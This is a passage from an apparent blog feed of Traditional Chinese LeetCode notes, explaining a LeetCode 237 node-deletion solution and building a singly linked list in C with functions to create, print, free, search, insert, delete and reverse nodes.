class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">deleteNode</span><span class="params">(<span class="keyword">struct</span> ListNode* node)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>  *<span class="title">nextNode</span>, *<span class="title">current</span> =</span> node ;</span><br><span class="line">    <span class="keyword">while</span>(current-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line"></span><br><span class="line">        nextNode = current-&gt;next;</span><br><span class="line">        current-&gt;val = nextNode-&gt;val;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;next-&gt;next == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            current-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//update current pointer</span></span><br><span class="line">            current = nextNode;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>執行結果如下:</p><p><img src="/img/LeetCode/237/result-1.png"></p><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><p>其實有更加精簡的寫法，但時間複雜度其實沒什麼太大差異</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">deleteNode</span><span class="params">(<span class="keyword">struct</span> ListNode* node)</span>&#123;</span><br><span class="line">    node-&gt;val = node-&gt;next-&gt;val;</span><br><span class="line">    node-&gt;next = node-&gt;next-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>執行結果:<br><img src="/img/LeetCode/237/result-2.png"></p><blockquote><p>但好像多花費了 1ms, ….</p></blockquote><h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p><strong>時間複雜度</strong>: $O(1)$: 本演算法包含固定數量的操作，像是更新當前節點的資料並更改其下一個指標，這些操作中的每一個都需要固定的時間，無論 Linked List 的大小如何。<br><strong>空間複雜度</strong>: $O(1)$: 這種刪除技術不需要任何額外的記憶體分配，因為它直接在現有節點上操作而無需建立額外的資料結構</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題必備神器 | 鏈結串列 (Linked List) | LeetCode 筆記</title>
      <link href="/posts/c1fe4928.html"/>
      <url>/posts/c1fe4928.html</url>
      
        <content type="html"><![CDATA[<h1 id="鏈結串列-Linked-List-介紹"><a href="#鏈結串列-Linked-List-介紹" class="headerlink" title="鏈結串列(Linked List)介紹"></a>鏈結串列(Linked List)介紹</h1><p><img src="/img/LeetCode/Linked_List/linked_list.png"></p><p>Linked List 是一種常見的資料結構，其組成主要包含 <strong>資料</strong> 和 <strong>下一個節點的位址</strong>，因此構成節點與節點相互鏈結的結構，其中最後一個節點會指向到 NULL 這個位址。</p><p>我們實踐的主要方式還是透過 C 語言去操作，想要實現 Linked List 必須先透過 <code>struct</code> 來去先定義節點本身</p><h1 id="Linked-List-實踐"><a href="#Linked-List-實踐" class="headerlink" title="Linked List 實踐"></a>Linked List 實踐</h1><h2 id="定義節點"><a href="#定義節點" class="headerlink" title="定義節點"></a>定義節點</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; Node;</span><br></pre></td></tr></table></figure><p>上面定義了 node 這個結構，其中包含了整數資料 <code>data</code>， 代表節點本身存放的資料 以及struct 型別的指標，下一個結構相同節點的記憶體位址 <code>next</code>。並且此結構的宣告為 <code>Node</code>，方便我們後續宣告節點。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Node *first_node;</span><br><span class="line">Node *current_node;</span><br><span class="line">Node *previous_node;</span><br></pre></td></tr></table></figure><p>我們可以透過 Node 來去宣告三個指標，指向三個結構的記憶體位址，分別為 <code>first_node</code>, <code>current_node</code>, <code>previous_node</code>。這三個指標的用途:</p><ul><li><code>first_node</code> 用來指向鏈結的起始位址</li><li><code>current_node</code> 用來指向鏈結目前所在節點，通常再 traverse link 的時候很常用</li><li><code>previous_node</code> 用來指向current_node 的前一個節點，在建立節點或者反轉整個linked list 的時候很常用</li></ul><p>現在可以開始從0 建立鏈結。</p><h2 id="建立-Linked-List"><a href="#建立-Linked-List" class="headerlink" title="建立 Linked List"></a>建立 Linked List</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> node_numbers;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;node_numbers);</span><br><span class="line">  create_new_node(node_numbers);</span><br><span class="line">  current_node = first_node;</span><br><span class="line">  <span class="keyword">while</span> (current_node!= <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%p]|&quot;</span>,current_node);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data: %d&quot;</span>,current_node-&gt;data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;| Addr. of next node=%p \n&quot;</span>,current_node-&gt;next);</span><br><span class="line">    current_node=current_node-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的程式碼中，我們首先提供輸入來決定要建立的節點數量，接著呼叫 <code>create_new_node</code> 函式，並且從第一個節點依序印出節點資料和下一個節點的位址，最後透過 <code>current_node=current_node-&gt;next;</code> 來移動到下一個節點。</p><p>這裡最需要做的就是要建立 <code>create_new_node</code> 函式</p><h2 id="建立節點-Create-new-node"><a href="#建立節點-Create-new-node" class="headerlink" title="建立節點 (Create_new_node)"></a>建立節點 (<code>Create_new_node</code>)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">create_new_node</span><span class="params">(<span class="type">int</span> node_nums)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt; node_nums; i++)&#123;</span><br><span class="line">        <span class="comment">// Declare new node</span></span><br><span class="line">        current_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data for node %d : &quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// Enter node data</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;(current_node-&gt;data));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// First node, don&#x27;t have previous node, so let the first_node and previous_node equal to current_node</span></span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">            first_node = current_node;</span><br><span class="line">            previous_node = current_node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// Set the previous node point to the current node</span></span><br><span class="line">            previous_node-&gt;next = current_node;</span><br><span class="line">            current_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="comment">// Set the previous node to current node, prepare to next node creation (or not)</span></span><br><span class="line">            previous_node = current_node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在函式內，透過 <code>for loop</code> 來重複節點的建立</li><li>透過 malloc 動態分配具有 <code>Node</code> 大小空間，並將 current_node 指向其記憶體位址</li><li>讓使用者手動輸入 data 內容</li><li><code>current_node -&gt; data</code> 代表存取這個記憶體位址的 data 變數，這裡也是直接將手動輸入的資料值存放到節點中的data變數中</li><li>接著就是判斷是否是建立第一個節點，當建立第一個節點的時候，記得要更新 <code>first_node</code> 這個指標，確保指到當前節點，並且這時候也沒有前一個節點，因此也將 <code>previous_node</code> 更新為 <code>current_node</code> 也就是目前節點</li><li>如果開始建立後續的節點，則要讓前一個節點指向到目前節點的記憶體位址，才能夠鏈結起來，所以 <code>previous_node-&gt;next = current_node;</code></li><li>並且將 <code>current_node</code> 的下一個節點記憶體位址指向 NULL，所以 <code>current_node -&gt; next = NULL;</code></li><li>最後還需要更新 <code>previous_node</code> 為當前節點</li></ul><h2 id="印出節點-PrintList"><a href="#印出節點-PrintList" class="headerlink" title="印出節點 (PrintList)"></a>印出節點 (<code>PrintList</code>)</h2><p>在建立完節點，難免想要印出整個串列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// input parameter is node struct</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    <span class="comment">// Decalre the address of input node</span></span><br><span class="line">    Node *node = first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;List is empty!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>( node != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d -&gt; &quot;</span>, node-&gt;data);</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;Null \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>主要邏輯就是讓從 first node 順著鏈結一直往下跑，所以將 <code>node = node -&gt; next</code> 直到遇到 Null</li><li>函式的輸入會式初始節點位址</li><li>需要判斷list是否為空</li></ul><p>接著在 main 函式呼叫即可印出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PrintList(first_node);</span><br></pre></td></tr></table></figure><h2 id="釋放記憶體"><a href="#釋放記憶體" class="headerlink" title="釋放記憶體"></a>釋放記憶體</h2><p>由於每個節點都是透過 <strong>malloc</strong> 進行動態宣告的，引此占用的記憶體位址在執行結束後要進行釋放，因此一樣需要檢索每個鏈結節點去進行 <code>free()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    Node *current, *temp_node;</span><br><span class="line">    current = first;</span><br><span class="line">    <span class="keyword">while</span> ( current != <span class="literal">NULL</span> )&#123;</span><br><span class="line">        <span class="comment">// Put the node that wants to be removed into temp_node</span></span><br><span class="line">        temp_node = current;</span><br><span class="line">        <span class="comment">// Let the current node point to the next node</span></span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        <span class="comment">// Free the node</span></span><br><span class="line">        <span class="built_in">free</span>(temp_node);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>函式傳入參數一樣會是初始節點的位址</li><li>一旦尚未到 NULL 的時候會需要將 當前節點丟到一個暫存的記憶體位址去進行 <code>free()</code>，如果直接 <code>free(current)</code> 則所存放的下一個節點的記憶體位址就找不到了</li><li>接著在讓當前節點繼續著 list 往下走 <code>current = current-&gt;next;</code></li></ul><h2 id="查找節點"><a href="#查找節點" class="headerlink" title="查找節點"></a>查找節點</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Return value should be the address of the node</span></span><br><span class="line">Node* <span class="title function_">SearchNode</span><span class="params">(Node* first, <span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node * node = first;</span><br><span class="line">    <span class="keyword">while</span> ( node != <span class="literal">NULL</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span> (node-&gt;data == item)&#123;</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>這裡函數的宣告型別也是用 <code>Node* </code> 因為回傳值會是一個結構指標，也就是節點的記憶體位址</li><li>傳入參數也需要傳輸 list 的初始節點位址，以及想要找的data值</li><li>一樣順著 Lists 找 (<code>node= node-&gt;next;</code>) 如果有找到節點的資料值等於 <code>item</code> 就回傳節點，直到遇到 Null 為止</li></ul><h2 id="插入節點"><a href="#插入節點" class="headerlink" title="插入節點"></a>插入節點</h2><p>插入節點這邊根據不同狀況分成不同函數處理:</p><ul><li>插入到 List 中間</li><li>插入到 List 的頭</li><li>插入到 List 的尾端</li></ul><h3 id="插中間"><a href="#插中間" class="headerlink" title="插中間"></a>插中間</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InsertNode</span><span class="params">(Node* node, <span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node *new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    <span class="comment">// Point the new node to the nexy item of original node</span></span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = node-&gt;next;</span><br><span class="line">    <span class="comment">// Point the original node to new node</span></span><br><span class="line">    node -&gt; next = new_node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>函數的傳入參數會是一個 node，並且還需要提供插入節點的資料值</li><li>接著就是新建立一個節點，為它分配記憶體空間</li><li>將新節點的 <code>data</code> 變數放入 <code>item</code> 這個資料值</li><li>將新結點的 <code>next</code> 放入原本輸入節點的下一個節點位址</li><li>將原本書入節點的 <code>next</code> 指向我們新建立的節點<br>這樣就完成插入節點的操作了</li></ul><h3 id="插頭"><a href="#插頭" class="headerlink" title="插頭"></a>插頭</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Insert a node to the front of the list</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push_front</span><span class="params">(<span class="type">int</span>  item)</span>&#123;</span><br><span class="line">    Node * new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = first_node; <span class="comment">// new node pointer point to original first node</span></span><br><span class="line">    first_node = new_node;  <span class="comment">// Update the first node to the new node</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>因為是頭，所以輸入參數就直接給資料值就好</li><li>一樣建立新節點，並為其分配記憶體空間</li><li>將 <code>item</code> 放入新節點的 <code>data</code></li><li>將新節點的 <code>next</code> 指向到第一個節點</li><li>更新 <code>first_node</code> 為新的節點</li></ul><h3 id="插尾端"><a href="#插尾端" class="headerlink" title="插尾端"></a>插尾端</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Insert a node to the back of the list</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push_back</span><span class="params">(<span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node * new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// Handle empty list</span></span><br><span class="line">    <span class="keyword">if</span> (first_node == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        first_node = new_node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// Initailize the current node to the first node for traversal</span></span><br><span class="line">        Node * current_node = first_node;</span><br><span class="line">        <span class="keyword">while</span> (current_node-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="comment">// traverse through the list</span></span><br><span class="line">            current_node = current_node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Point to the new node</span></span><br><span class="line">        current_node-&gt;next = new_node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>一樣輸入參數會是新節點的資料值</li><li>一樣建立新的節點，並且分配記憶體空間給他</li><li>將新節點的資料值給予 <code>item</code></li><li>將新節點的指標指向 NULL</li><li>接下來就是處理插入，但這樣會先進行一個例外處理，就是要先判斷 List是否為空，如果是空的就將 <code>first_node</code> 更新為我們新建立的 <code>new_node</code></li><li>若 list 非空，則需要先 traverse 整個 list 找到最後一個節點，所以將 <code>current_node</code> 更新為 <code>first_node</code></li><li>若尚未抵達最後一個節點，則繼續 traverse <code>current_node = current_node-&gt;next;</code></li><li>抵達最後節點後，將最後節點的指標值指向新建立的節點</li></ul><h2 id="刪除節點"><a href="#刪除節點" class="headerlink" title="刪除節點"></a>刪除節點</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Node* <span class="title function_">DeleteNode</span><span class="params">(Node* first ,Node* node)</span>&#123;</span><br><span class="line">    Node* ptr= first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Noting to print\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Delete first node of the list</span></span><br><span class="line">    <span class="keyword">if</span> (node == first)&#123;</span><br><span class="line">        <span class="comment">// Update the first pointer to the next node</span></span><br><span class="line">        first = first-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// ptr traverse through the list</span></span><br><span class="line">        <span class="keyword">while</span> (ptr-&gt;next != node)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr-&gt;next = node-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>傳入參數會有，初始節點，以及要被刪除的節點</li><li>一開始一樣會需要判斷 <code>first_node</code> 是否為 null，如果是 null 也沒東西給你刪</li><li>接著一樣會分成不同情況處理，分別是<ul><li>刪除頭</li><li>刪除中間和尾端</li></ul></li><li>刪除頭的處理方式會是先更新 <code>first_node</code> 更新為它的下一個節點</li><li>接著直接使用 <code>free()</code> 釋放記憶體</li><li>再來就是當鏈結還沒抵達要被刪除的節點時，繼續 traverse  (<code>ptr = ptr-&gt;next</code>)</li><li>一旦找到了則將它的指標，先指向下一個節點的下一個節點位址</li><li>接著直接使用 <code>free()</code> 釋放記憶體</li></ul><h2 id="反轉鏈結串列-Reverse-Linked-List"><a href="#反轉鏈結串列-Reverse-Linked-List" class="headerlink" title="反轉鏈結串列 (Reverse Linked List)"></a>反轉鏈結串列 (Reverse Linked List)</h2><p><img src="/img/LeetCode/Linked_List/reverse-1.png"></p><p>要反轉一個陣列，會需要一個額外節點來暫時存放節點位址。</p><h3 id="解釋"><a href="#解釋" class="headerlink" title="解釋"></a>解釋</h3><p>如果首先就把初始節點 (A節點)的指標指向 NULL 會有個問題，原先的指標存放的是下一個節點的位址，<strong>如果改成 NULL 不就不知道原先下一個節點的位址了嗎?</strong> 連節點位址都沒有要怎麼進行反轉?因此才需要額外的節點才指向到 B 節點，來存放B的記憶體位址。</p><p>因此步驟如下圖：</p><ol><li>定義指標指向 NULL</li><li>建立暫存節點，指向到當前節點的下一個節點</li><li>將當前節點改指向 NULL</li><li>將下一個節點 (B節點)改指向上一個節點 (A節點)</li><li>更新暫存節點的指標，指向再下一個節點的位址<br><img src="/img/LeetCode/Linked_List/reverse-2.png"></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Reverse</span><span class="params">()</span>&#123;  </span><br><span class="line">    Node *current, *previous, *preceding;</span><br><span class="line">    previous = <span class="literal">NULL</span>;</span><br><span class="line">    current = first_node;</span><br><span class="line">    <span class="comment">// preceding node store the previous address of the current node</span></span><br><span class="line">    preceding = first_node-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (preceding != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">// pointer the current node to the NULL (previous) node</span></span><br><span class="line">        current-&gt;next = previous;</span><br><span class="line">        <span class="comment">// Update previous poinert to current pointer</span></span><br><span class="line">        previous = current;</span><br><span class="line">        <span class="comment">// Update current pointer to the preceding point</span></span><br><span class="line">        current = preceding;</span><br><span class="line">        <span class="comment">// Update the preceding pointer to the next node;</span></span><br><span class="line">        preceding = preceding-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;next =previous;</span><br><span class="line">    first_node=current;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>current</code>：指向當前節點的指標，初始值為linked list的第一個節點 <code>first_node</code></li><li><code>previous</code>：指向前一個節點的指標，初始值為 NULL，因為在開始時沒有前一個節點</li><li><code>preceding</code>：指向當前節點的下一個節點的指標，初始值為 <code>first_node</code> 的下一個節點</li><li>接著在 while 迴圈內，循環走訪linked list，直到 preceding 變為 NULL</li><li><code>current-&gt;next = previous;</code>：將當前節點的 <code>next</code> 指標指向前一個節點（反轉指標方向）</li><li><code>previous = current;</code>：將 <code>previous</code> 更新為目前節點</li><li><code>current = preceding;</code>：將 <code>current</code> 更新為下一個節點</li><li><code>preceding = preceding-&gt;next;</code>：將 <code>preceding</code> 更新為下一個節點的下一個節點</li><li>接著是最後一個節點的處理，這時也是將，將最後節點的 <code>next</code> 指標指向前一個節點（反轉指標方向）</li><li>另外就是要將初始節點的指標更新為當前節點</li><li><code>first_node = current;</code>：更新linked list的頭節點 <code>first_node</code>，現在 current 指向原始linked list的最後一個節點，即新的頭節點</li></ul><h1 id="全部程式碼"><a href="#全部程式碼" class="headerlink" title="全部程式碼"></a>全部程式碼</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span 